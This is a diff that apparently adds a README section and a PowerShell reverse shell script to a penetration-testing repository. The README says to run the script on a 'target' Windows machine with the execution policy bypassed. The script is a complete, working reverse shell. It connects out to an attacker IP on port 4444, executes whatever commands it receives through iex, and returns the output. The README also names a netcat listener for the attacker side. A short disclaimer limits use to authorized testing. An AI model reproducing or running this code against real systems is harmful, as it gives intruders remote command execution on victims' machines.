@@ -1,0 +1,56 @@
+
+## **Using the reverse.ps1 Script (Windows Targets)**
+
+1.Download the reverse.ps1 file from this repo.
+
+2.Edit the $YOUR_IP and $PORT variables inside the script to match your attacker machine.
+
+3.Save the file.
+
+4.Run it on the target Windows machine:
+```bash
+powershell -ExecutionPolicy Bypass -File .\reverse.ps1
+
+```
+## **⚠️ Legal Disclaimer**
+
+This repository is provided for educational and authorized penetration testing purposes only. The author assumes no liability for any misuse of this information. Always ensure you have explicit written permission before testing any system.
+
+#### **File 2: `reverse.ps1` (No changes needed, but confirmed here)**
+*(This script is for Windows targets connecting to an attacker)*
+
+```powershell
+# PowerShell Reverse Shell Script
+# Author: Yash Tamboli
+#
+# INSTRUCTIONS:
+# 1. Change $YOUR_IP to your attacker machine's IP address.
+# 2. Change $PORT if needed (default is 4444).
+# 3. Run this script on the target Windows machine.
+# 4. Ensure your attacker machine is listening (e.g., nc -lnvp 4444).
+
+# --- CONFIGURATION ---
+$YOUR_IP = "192.168.1.100"  # <-- REPLACE WITH YOUR ATTACKER IP
+$PORT = 4444                # <-- REPLACE WITH YOUR LISTENER PORT
+# ---------------------
+
+Write-Host "Attempting connection to $YOUR_IP : $PORT"
+
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($YOUR_IP, $PORT)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535 | % {0}
+
+    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+        $sendback = (iex $data 2>&1 | Out-String)
+        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte, 0, $sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
+} catch {
+    Write-Host "Connection failed. Check IP, Port, and Firewall settings."
+}
+
